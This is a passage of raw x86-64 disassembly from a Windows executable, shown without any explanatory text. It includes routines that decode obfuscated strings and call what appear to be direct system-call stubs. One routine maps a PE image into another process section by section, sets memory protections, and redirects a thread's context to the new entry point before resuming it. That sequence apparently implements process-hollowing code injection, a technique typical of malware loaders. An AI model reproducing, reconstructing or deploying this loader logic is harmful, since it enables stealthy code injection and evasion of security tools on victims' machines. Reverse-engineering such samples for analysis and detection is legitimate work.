   140003443:	31 d2                	xor    %edx,%edx
   140003445:	e8 16 6c 00 00       	call   0x14000a060
   14000344a:	80 3d 1c fe 2b 00 00 	cmpb   $0x0,0x2bfe1c(%rip)        # 0x1402c326d
   140003451:	0f 84 24 01 00 00    	je     0x14000357b
   140003457:	80 3d 24 ff 2b 00 00 	cmpb   $0x0,0x2bff24(%rip)        # 0x1402c3382
   14000345e:	74 33                	je     0x140003493
   140003460:	f3 0f 7e 05 10 ff 2b 	movq   0x2bff10(%rip),%xmm0        # 0x1402c3378
   140003467:	00 
   140003468:	66 0f fd c7          	paddw  %xmm7,%xmm0
   14000346c:	66 41 0f db c0       	pand   %xmm8,%xmm0
   140003471:	66 0f d6 05 ff fe 2b 	movq   %xmm0,0x2bfeff(%rip)        # 0x1402c3378
   140003478:	00 
   140003479:	8b 05 01 ff 2b 00    	mov    0x2bff01(%rip),%eax        # 0x1402c3380
   14000347f:	83 c0 13             	add    $0x13,%eax
   140003482:	0f b6 c0             	movzbl %al,%eax
   140003485:	66 89 05 f4 fe 2b 00 	mov    %ax,0x2bfef4(%rip)        # 0x1402c3380
   14000348c:	c6 05 ef fe 2b 00 00 	movb   $0x0,0x2bfeef(%rip)        # 0x1402c3382
   140003493:	4c 89 f1             	mov    %r14,%rcx
   140003496:	48 8d 15 db fe 2b 00 	lea    0x2bfedb(%rip),%rdx        # 0x1402c3378
   14000349d:	e8 ce 6a 00 00       	call   0x140009f70
   1400034a2:	4c 89 f1             	mov    %r14,%rcx
   1400034a5:	4c 89 e2             	mov    %r12,%rdx
   1400034a8:	e8 b3 6a 00 00       	call   0x140009f60
   1400034ad:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400034b4:	00 00 
   1400034b6:	4c 89 f1             	mov    %r14,%rcx
   1400034b9:	e8 c2 6a 00 00       	call   0x140009f80
   1400034be:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400034c5:	01 c0                	add    %eax,%eax
   1400034c7:	66 89 4c 24 62       	mov    %cx,0x62(%rsp)
   1400034cc:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1400034d1:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1400034d6:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   1400034dd:	00 
   1400034de:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   1400034e5:	00 
   1400034e6:	c7 84 24 80 00 00 00 	movl   $0x30,0x80(%rsp)
   1400034ed:	30 00 00 00 
   1400034f1:	c7 84 24 98 00 00 00 	movl   $0x40,0x98(%rsp)
   1400034f8:	40 00 00 00 
   1400034fc:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   140003503:	00 
   140003504:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   14000350b:	00 
   14000350c:	0f 11 30             	movups %xmm6,(%rax)
   14000350f:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140003516:	00 
   140003517:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000351e:	00 00 
   140003520:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140003527:	00 
   140003528:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   14000352f:	00 
   140003530:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003537:	00 
   140003538:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000353f:	00 
   140003540:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003547:	00 00 
   140003549:	4c 89 e9             	mov    %r13,%rcx
   14000354c:	ba 16 01 12 00       	mov    $0x120116,%edx
   140003551:	49 89 e8             	mov    %rbp,%r8
   140003554:	49 89 f1             	mov    %rsi,%r9
   140003557:	e8 c6 de ff ff       	call   0x140001422
   14000355c:	85 c0                	test   %eax,%eax
   14000355e:	78 0a                	js     0x14000356a
   140003560:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003565:	e8 f4 de ff ff       	call   0x14000145e
   14000356a:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003570:	66 85 c0             	test   %ax,%ax
   140003573:	0f 85 9d fe ff ff    	jne    0x140003416
   140003579:	eb 46                	jmp    0x1400035c1
   14000357b:	c6 05 00 fe 2b 00 01 	movb   $0x1,0x2bfe00(%rip)        # 0x1402c3382
   140003582:	48 b8 49 00 2c 00 2c 	movabs $0x49002c002c0049,%rax
   140003589:	00 49 00 
   14000358c:	48 89 05 e5 fd 2b 00 	mov    %rax,0x2bfde5(%rip)        # 0x1402c3378
   140003593:	66 c7 05 e4 fd 2b 00 	movw   $0xed,0x2bfde4(%rip)        # 0x1402c3380
   14000359a:	ed 00 
   14000359c:	48 8d 0d 5d 02 00 00 	lea    0x25d(%rip),%rcx        # 0x140003800
   1400035a3:	e8 c8 dd ff ff       	call   0x140001370
   1400035a8:	c6 05 be fc 2b 00 01 	movb   $0x1,0x2bfcbe(%rip)        # 0x1402c326d
   1400035af:	80 3d cc fd 2b 00 00 	cmpb   $0x0,0x2bfdcc(%rip)        # 0x1402c3382
   1400035b6:	0f 85 a4 fe ff ff    	jne    0x140003460
   1400035bc:	e9 d2 fe ff ff       	jmp    0x140003493
   1400035c1:	48 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%rsi
   1400035c8:	00 
   1400035c9:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400035cf:	48 89 f1             	mov    %rsi,%rcx
   1400035d2:	31 d2                	xor    %edx,%edx
   1400035d4:	e8 87 6a 00 00       	call   0x14000a060
   1400035d9:	80 3d 88 fc 2b 00 00 	cmpb   $0x0,0x2bfc88(%rip)        # 0x1402c3268
   1400035e0:	0f 84 ae 01 00 00    	je     0x140003794
   1400035e6:	80 3d c5 fc 2b 00 00 	cmpb   $0x0,0x2bfcc5(%rip)        # 0x1402c32b2
   1400035ed:	74 3c                	je     0x14000362b
   1400035ef:	f3 0f 7e 05 b1 fc 2b 	movq   0x2bfcb1(%rip),%xmm0        # 0x1402c32a8
   1400035f6:	00 
   1400035f7:	66 0f fd 05 01 80 00 	paddw  0x8001(%rip),%xmm0        # 0x14000b600
   1400035fe:	00 
   1400035ff:	66 0f db 05 e9 7f 00 	pand   0x7fe9(%rip),%xmm0        # 0x14000b5f0
   140003606:	00 
   140003607:	66 0f d6 05 99 fc 2b 	movq   %xmm0,0x2bfc99(%rip)        # 0x1402c32a8
   14000360e:	00 
   14000360f:	b8 cf 00 00 00       	mov    $0xcf,%eax
   140003614:	03 05 96 fc 2b 00    	add    0x2bfc96(%rip),%eax        # 0x1402c32b0
   14000361a:	0f b6 c0             	movzbl %al,%eax
   14000361d:	66 89 05 8c fc 2b 00 	mov    %ax,0x2bfc8c(%rip)        # 0x1402c32b0
   140003624:	c6 05 87 fc 2b 00 00 	movb   $0x0,0x2bfc87(%rip)        # 0x1402c32b2
   14000362b:	48 8d 15 76 fc 2b 00 	lea    0x2bfc76(%rip),%rdx        # 0x1402c32a8
   140003632:	48 89 f1             	mov    %rsi,%rcx
   140003635:	e8 36 69 00 00       	call   0x140009f70
   14000363a:	48 89 f1             	mov    %rsi,%rcx
   14000363d:	48 89 da             	mov    %rbx,%rdx
   140003640:	e8 1b 69 00 00       	call   0x140009f60
   140003645:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000364c:	00 00 00 00 00 
   140003651:	48 89 f1             	mov    %rsi,%rcx
   140003654:	e8 27 69 00 00       	call   0x140009f80
   140003659:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003660:	01 c0                	add    %eax,%eax
   140003662:	66 89 8c 24 82 00 00 	mov    %cx,0x82(%rsp)
   140003669:	00 
   14000366a:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   140003671:	00 
   140003672:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140003679:	00 
   14000367a:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000367d:	0f 29 b4 24 d0 00 00 	movaps %xmm6,0xd0(%rsp)
   140003684:	00 
   140003685:	0f 29 b4 24 e0 00 00 	movaps %xmm6,0xe0(%rsp)
   14000368c:	00 
   14000368d:	c7 84 24 d0 00 00 00 	movl   $0x30,0xd0(%rsp)
   140003694:	30 00 00 00 
   140003698:	c7 84 24 e8 00 00 00 	movl   $0x40,0xe8(%rsp)
   14000369f:	40 00 00 00 
   1400036a3:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400036aa:	00 
   1400036ab:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400036b2:	00 
   1400036b3:	0f 29 b4 24 f0 00 00 	movaps %xmm6,0xf0(%rsp)
   1400036ba:	00 
   1400036bb:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400036c2:	00 00 
   1400036c4:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400036cb:	00 
   1400036cc:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400036d3:	00 
   1400036d4:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400036db:	00 00 
   1400036dd:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400036e4:	00 
   1400036e5:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400036ec:	00 
   1400036ed:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400036f4:	00 
   1400036f5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400036fc:	00 
   1400036fd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003704:	00 00 
   140003706:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000370b:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   140003712:	00 
   140003713:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   14000371a:	00 
   14000371b:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140003720:	49 89 f1             	mov    %rsi,%r9
   140003723:	e8 fa dc ff ff       	call   0x140001422
   140003728:	85 c0                	test   %eax,%eax
   14000372a:	78 3b                	js     0x140003767
   14000372c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003731:	0f 11 74 24 38       	movups %xmm6,0x38(%rsp)
   140003736:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000373a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000373e:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140003745:	00 
   140003746:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000374b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003750:	31 d2                	xor    %edx,%edx
   140003752:	45 31 c0             	xor    %r8d,%r8d
   140003755:	45 31 c9             	xor    %r9d,%r9d
   140003758:	e8 d4 dc ff ff       	call   0x140001431
   14000375d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003762:	e8 f7 dc ff ff       	call   0x14000145e
   140003767:	0f 28 b4 24 f0 04 00 	movaps 0x4f0(%rsp),%xmm6
   14000376e:	00 
   14000376f:	0f 28 bc 24 00 05 00 	movaps 0x500(%rsp),%xmm7
   140003776:	00 
   140003777:	44 0f 28 84 24 10 05 	movaps 0x510(%rsp),%xmm8
   14000377e:	00 00 
   140003780:	48 81 c4 28 05 00 00 	add    $0x528,%rsp
   140003787:	5b                   	pop    %rbx
   140003788:	5d                   	pop    %rbp
   140003789:	5f                   	pop    %rdi
   14000378a:	5e                   	pop    %rsi
   14000378b:	41 5c                	pop    %r12
   14000378d:	41 5d                	pop    %r13
   14000378f:	41 5e                	pop    %r14
   140003791:	41 5f                	pop    %r15
   140003793:	c3                   	ret
   140003794:	c6 05 17 fb 2b 00 01 	movb   $0x1,0x2bfb17(%rip)        # 0x1402c32b2
   14000379b:	48 b8 8d 00 70 00 70 	movabs $0x8d00700070008d,%rax
   1400037a2:	00 8d 00 
   1400037a5:	48 89 05 fc fa 2b 00 	mov    %rax,0x2bfafc(%rip)        # 0x1402c32a8
   1400037ac:	66 c7 05 fb fa 2b 00 	movw   $0x31,0x2bfafb(%rip)        # 0x1402c32b0
   1400037b3:	31 00 
   1400037b5:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x1400037e0
   1400037bc:	e8 af db ff ff       	call   0x140001370
   1400037c1:	c6 05 a0 fa 2b 00 01 	movb   $0x1,0x2bfaa0(%rip)        # 0x1402c3268
   1400037c8:	80 3d e3 fa 2b 00 00 	cmpb   $0x0,0x2bfae3(%rip)        # 0x1402c32b2
   1400037cf:	0f 85 1a fe ff ff    	jne    0x1400035ef
   1400037d5:	e9 51 fe ff ff       	jmp    0x14000362b
   1400037da:	cc                   	int3
   1400037db:	cc                   	int3
   1400037dc:	cc                   	int3
   1400037dd:	cc                   	int3
   1400037de:	cc                   	int3
   1400037df:	cc                   	int3
   1400037e0:	66 c7 05 c7 fa 2b 00 	movw   $0x0,0x2bfac7(%rip)        # 0x1402c32b0
   1400037e7:	00 00 
   1400037e9:	48 c7 05 b4 fa 2b 00 	movq   $0x0,0x2bfab4(%rip)        # 0x1402c32a8
   1400037f0:	00 00 00 00 
   1400037f4:	c3                   	ret
   1400037f5:	cc                   	int3
   1400037f6:	cc                   	int3
   1400037f7:	cc                   	int3
   1400037f8:	cc                   	int3
   1400037f9:	cc                   	int3
   1400037fa:	cc                   	int3
   1400037fb:	cc                   	int3
   1400037fc:	cc                   	int3
   1400037fd:	cc                   	int3
   1400037fe:	cc                   	int3
   1400037ff:	cc                   	int3
   140003800:	66 c7 05 77 fb 2b 00 	movw   $0x0,0x2bfb77(%rip)        # 0x1402c3380
   140003807:	00 00 
   140003809:	48 c7 05 64 fb 2b 00 	movq   $0x0,0x2bfb64(%rip)        # 0x1402c3378
   140003810:	00 00 00 00 
   140003814:	c3                   	ret
   140003815:	cc                   	int3
   140003816:	cc                   	int3
   140003817:	cc                   	int3
   140003818:	cc                   	int3
   140003819:	cc                   	int3
   14000381a:	cc                   	int3
   14000381b:	cc                   	int3
   14000381c:	cc                   	int3
   14000381d:	cc                   	int3
   14000381e:	cc                   	int3
   14000381f:	cc                   	int3
   140003820:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003823:	0f 11 05 10 fb 2b 00 	movups %xmm0,0x2bfb10(%rip)        # 0x1402c333a
   14000382a:	0f 29 05 ff fa 2b 00 	movaps %xmm0,0x2bfaff(%rip)        # 0x1402c3330
   140003831:	0f 29 05 e8 fa 2b 00 	movaps %xmm0,0x2bfae8(%rip)        # 0x1402c3320
   140003838:	0f 29 05 d1 fa 2b 00 	movaps %xmm0,0x2bfad1(%rip)        # 0x1402c3310
   14000383f:	0f 29 05 ba fa 2b 00 	movaps %xmm0,0x2bfaba(%rip)        # 0x1402c3300
   140003846:	0f 29 05 a3 fa 2b 00 	movaps %xmm0,0x2bfaa3(%rip)        # 0x1402c32f0
   14000384d:	0f 29 05 8c fa 2b 00 	movaps %xmm0,0x2bfa8c(%rip)        # 0x1402c32e0
   140003854:	0f 29 05 75 fa 2b 00 	movaps %xmm0,0x2bfa75(%rip)        # 0x1402c32d0
   14000385b:	c3                   	ret
   14000385c:	cc                   	int3
   14000385d:	cc                   	int3
   14000385e:	cc                   	int3
   14000385f:	cc                   	int3
   140003860:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003863:	0f 29 05 e6 fa 2b 00 	movaps %xmm0,0x2bfae6(%rip)        # 0x1402c3350
   14000386a:	c7 05 ec fa 2b 00 00 	movl   $0x0,0x2bfaec(%rip)        # 0x1402c3360
   140003871:	00 00 00 
   140003874:	c3                   	ret
   140003875:	cc                   	int3
   140003876:	cc                   	int3
   140003877:	cc                   	int3
   140003878:	cc                   	int3
   140003879:	cc                   	int3
   14000387a:	cc                   	int3
   14000387b:	cc                   	int3
   14000387c:	cc                   	int3
   14000387d:	cc                   	int3
   14000387e:	cc                   	int3
   14000387f:	cc                   	int3
   140003880:	c7 05 e6 fa 2b 00 00 	movl   $0x0,0x2bfae6(%rip)        # 0x1402c3370
   140003887:	00 00 00 
   14000388a:	48 c7 05 d3 fa 2b 00 	movq   $0x0,0x2bfad3(%rip)        # 0x1402c3368
   140003891:	00 00 00 00 
   140003895:	c3                   	ret
   140003896:	cc                   	int3
   140003897:	cc                   	int3
   140003898:	cc                   	int3
   140003899:	cc                   	int3
   14000389a:	cc                   	int3
   14000389b:	cc                   	int3
   14000389c:	cc                   	int3
   14000389d:	cc                   	int3
   14000389e:	cc                   	int3
   14000389f:	cc                   	int3
   1400038a0:	66 c7 05 a7 0b 2c 00 	movw   $0x0,0x2c0ba7(%rip)        # 0x1402c4450
   1400038a7:	00 00 
   1400038a9:	48 c7 05 94 0b 2c 00 	movq   $0x0,0x2c0b94(%rip)        # 0x1402c4448
   1400038b0:	00 00 00 00 
   1400038b4:	c3                   	ret
   1400038b5:	cc                   	int3
   1400038b6:	cc                   	int3
   1400038b7:	cc                   	int3
   1400038b8:	cc                   	int3
   1400038b9:	cc                   	int3
   1400038ba:	cc                   	int3
   1400038bb:	cc                   	int3
   1400038bc:	cc                   	int3
   1400038bd:	cc                   	int3
   1400038be:	cc                   	int3
   1400038bf:	cc                   	int3
   1400038c0:	66 c7 05 f7 f9 2b 00 	movw   $0x0,0x2bf9f7(%rip)        # 0x1402c32c0
   1400038c7:	00 00 
   1400038c9:	48 c7 05 e4 f9 2b 00 	movq   $0x0,0x2bf9e4(%rip)        # 0x1402c32b8
   1400038d0:	00 00 00 00 
   1400038d4:	c3                   	ret
   1400038d5:	cc                   	int3
   1400038d6:	cc                   	int3
   1400038d7:	cc                   	int3
   1400038d8:	cc                   	int3
   1400038d9:	cc                   	int3
   1400038da:	cc                   	int3
   1400038db:	cc                   	int3
   1400038dc:	cc                   	int3
   1400038dd:	cc                   	int3
   1400038de:	cc                   	int3
   1400038df:	cc                   	int3
   1400038e0:	56                   	push   %rsi
   1400038e1:	57                   	push   %rdi
   1400038e2:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400038e9:	48 89 d6             	mov    %rdx,%rsi
   1400038ec:	48 89 cf             	mov    %rcx,%rdi
   1400038ef:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1400038f6:	00 00 
   1400038f8:	e8 83 66 00 00       	call   0x140009f80
   1400038fd:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003904:	01 c0                	add    %eax,%eax
   140003906:	66 89 4c 24 42       	mov    %cx,0x42(%rsp)
   14000390b:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   140003910:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140003915:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003918:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   14000391d:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140003922:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140003929:	00 
   14000392a:	c7 44 24 68 40 00 00 	movl   $0x40,0x68(%rsp)
   140003931:	00 
   140003932:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003937:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000393c:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140003941:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003948:	00 00 
   14000394a:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000394f:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003954:	ba 06 00 03 00       	mov    $0x30006,%edx
   140003959:	e8 1d dc ff ff       	call   0x14000157b
   14000395e:	85 c0                	test   %eax,%eax
   140003960:	78 42                	js     0x1400039a4
   140003962:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003969:	00 00 
   14000396b:	48 89 f1             	mov    %rsi,%rcx
   14000396e:	e8 0d 66 00 00       	call   0x140009f80
   140003973:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000397a:	01 c0                	add    %eax,%eax
   14000397c:	66 89 4c 24 32       	mov    %cx,0x32(%rsp)
   140003981:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140003986:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000398b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003990:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003995:	e8 1d dc ff ff       	call   0x1400015b7
   14000399a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000399f:	e8 ba da ff ff       	call   0x14000145e
   1400039a4:	90                   	nop
   1400039a5:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400039ac:	5f                   	pop    %rdi
   1400039ad:	5e                   	pop    %rsi
   1400039ae:	c3                   	ret
   1400039af:	cc                   	int3
   1400039b0:	41 57                	push   %r15
   1400039b2:	41 56                	push   %r14
   1400039b4:	41 55                	push   %r13
   1400039b6:	41 54                	push   %r12
   1400039b8:	56                   	push   %rsi
   1400039b9:	57                   	push   %rdi
   1400039ba:	55                   	push   %rbp
   1400039bb:	53                   	push   %rbx
   1400039bc:	48 81 ec 48 05 00 00 	sub    $0x548,%rsp
   1400039c3:	4c 89 ce             	mov    %r9,%rsi
   1400039c6:	48 89 d0             	mov    %rdx,%rax
   1400039c9:	48 89 ca             	mov    %rcx,%rdx
   1400039cc:	4c 8b 8c 24 b0 05 00 	mov    0x5b0(%rsp),%r9
   1400039d3:	00 
   1400039d4:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   1400039d9:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400039e0:	00 
   1400039e1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400039e6:	49 89 c0             	mov    %rax,%r8
   1400039e9:	e8 a2 ec ff ff       	call   0x140002690
   1400039ee:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400039f3:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400039f7:	0f 84 07 02 00 00    	je     0x140003c04
   1400039fd:	4c 63 7e 3c          	movslq 0x3c(%rsi),%r15
   140003a01:	4a 8b 44 3e 30       	mov    0x30(%rsi,%r15,1),%rax
   140003a06:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003a0b:	42 8b 44 3e 50       	mov    0x50(%rsi,%r15,1),%eax
   140003a10:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003a15:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003a1c:	00 
   140003a1d:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003a24:	00 
   140003a25:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140003a2a:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003a2f:	45 31 c0             	xor    %r8d,%r8d
   140003a32:	e8 72 da ff ff       	call   0x1400014a9
   140003a37:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003a3c:	85 c0                	test   %eax,%eax
   140003a3e:	0f 88 b9 01 00 00    	js     0x140003bfd
   140003a44:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003a49:	46 8b 4c 3e 54       	mov    0x54(%rsi,%r15,1),%r9d
   140003a4e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003a55:	00 00 
   140003a57:	49 89 f0             	mov    %rsi,%r8
   140003a5a:	e8 59 da ff ff       	call   0x1400014b8
   140003a5f:	66 42 83 7c 3e 06 00 	cmpw   $0x0,0x6(%rsi,%r15,1)
   140003a66:	0f 84 eb 00 00 00    	je     0x140003b57
   140003a6c:	48 b8 df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rax
   140003a73:	49 01 7d 
   140003a76:	4d 8d 2c 37          	lea    (%r15,%rsi,1),%r13
   140003a7a:	49 81 c5 10 01 00 00 	add    $0x110,%r13
   140003a81:	31 ed                	xor    %ebp,%ebp
   140003a83:	48 8d 78 02          	lea    0x2(%rax),%rdi
   140003a87:	48 8d 58 1e          	lea    0x1e(%rax),%rbx
   140003a8b:	4c 8d 60 3e          	lea    0x3e(%rax),%r12
   140003a8f:	eb 23                	jmp    0x140003ab4
   140003a91:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003a98:	0f 1f 84 00 00 00 00 
   140003a9f:	00 
   140003aa0:	ff c5                	inc    %ebp
   140003aa2:	42 0f b7 44 3e 06    	movzwl 0x6(%rsi,%r15,1),%eax
   140003aa8:	49 83 c5 28          	add    $0x28,%r13
   140003aac:	39 c5                	cmp    %eax,%ebp
   140003aae:	0f 83 a3 00 00 00    	jae    0x140003b57
   140003ab4:	41 8b 45 1c          	mov    0x1c(%r13),%eax
   140003ab8:	85 c0                	test   %eax,%eax
   140003aba:	48 89 f9             	mov    %rdi,%rcx
   140003abd:	48 ba df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rdx
   140003ac4:	49 01 7d 
   140003ac7:	48 0f 49 ca          	cmovns %rdx,%rcx
   140003acb:	4d 89 e6             	mov    %r12,%r14
   140003ace:	4c 0f 49 f3          	cmovns %rbx,%r14
   140003ad2:	a9 00 00 00 20       	test   $0x20000000,%eax
   140003ad7:	4c 0f 44 f1          	cmove  %rcx,%r14
   140003adb:	48 b8 23 94 fa 54 50 	movabs $0x82feb65054fa9423,%rax
   140003ae2:	b6 fe 82 
   140003ae5:	49 01 c6             	add    %rax,%r14
   140003ae8:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003aed:	41 8b 55 04          	mov    0x4(%r13),%edx
   140003af1:	45 8b 4d 08          	mov    0x8(%r13),%r9d
   140003af5:	48 03 54 24 38       	add    0x38(%rsp),%rdx
   140003afa:	45 8b 45 0c          	mov    0xc(%r13),%r8d
   140003afe:	49 01 f0             	add    %rsi,%r8
   140003b01:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003b08:	00 00 
   140003b0a:	e8 a9 d9 ff ff       	call   0x1400014b8
   140003b0f:	44 89 f0             	mov    %r14d,%eax
   140003b12:	83 e0 fe             	and    $0xfffffffe,%eax
   140003b15:	83 f8 04             	cmp    $0x4,%eax
   140003b18:	74 86                	je     0x140003aa0
   140003b1a:	41 8b 45 04          	mov    0x4(%r13),%eax
   140003b1e:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003b23:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003b28:	41 8b 45 00          	mov    0x0(%r13),%eax
   140003b2c:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003b31:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003b36:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140003b3b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003b40:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003b45:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140003b4a:	45 89 f1             	mov    %r14d,%r9d
   140003b4d:	e8 83 da ff ff       	call   0x1400015d5
   140003b52:	e9 49 ff ff ff       	jmp    0x140003aa0
   140003b57:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140003b5c:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003b62:	48 89 f9             	mov    %rdi,%rcx
   140003b65:	31 d2                	xor    %edx,%edx
   140003b67:	e8 f4 64 00 00       	call   0x14000a060
   140003b6c:	c7 84 24 a0 00 00 00 	movl   $0x100002,0xa0(%rsp)
   140003b73:	02 00 10 00 
   140003b77:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b7c:	48 89 fa             	mov    %rdi,%rdx
   140003b7f:	e8 07 d9 ff ff       	call   0x14000148b
   140003b84:	85 c0                	test   %eax,%eax
   140003b86:	78 70                	js     0x140003bf8
   140003b88:	42 8b 44 3e 28       	mov    0x28(%rsi,%r15,1),%eax
   140003b8d:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003b92:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   140003b99:	00 
   140003b9a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b9f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003ba4:	e8 f1 d8 ff ff       	call   0x14000149a
   140003ba9:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003bae:	85 c0                	test   %eax,%eax
   140003bb0:	78 4b                	js     0x140003bfd
   140003bb2:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140003bb9:	00 
   140003bba:	48 83 c2 10          	add    $0x10,%rdx
   140003bbe:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003bc5:	00 00 
   140003bc7:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003bcc:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140003bd2:	e8 e1 d8 ff ff       	call   0x1400014b8
   140003bd7:	85 c0                	test   %eax,%eax
   140003bd9:	78 1d                	js     0x140003bf8
   140003bdb:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003be0:	31 d2                	xor    %edx,%edx
   140003be2:	e8 95 d8 ff ff       	call   0x14000147c
   140003be7:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003bec:	e8 6d d8 ff ff       	call   0x14000145e
   140003bf1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140003bf6:	eb 13                	jmp    0x140003c0b
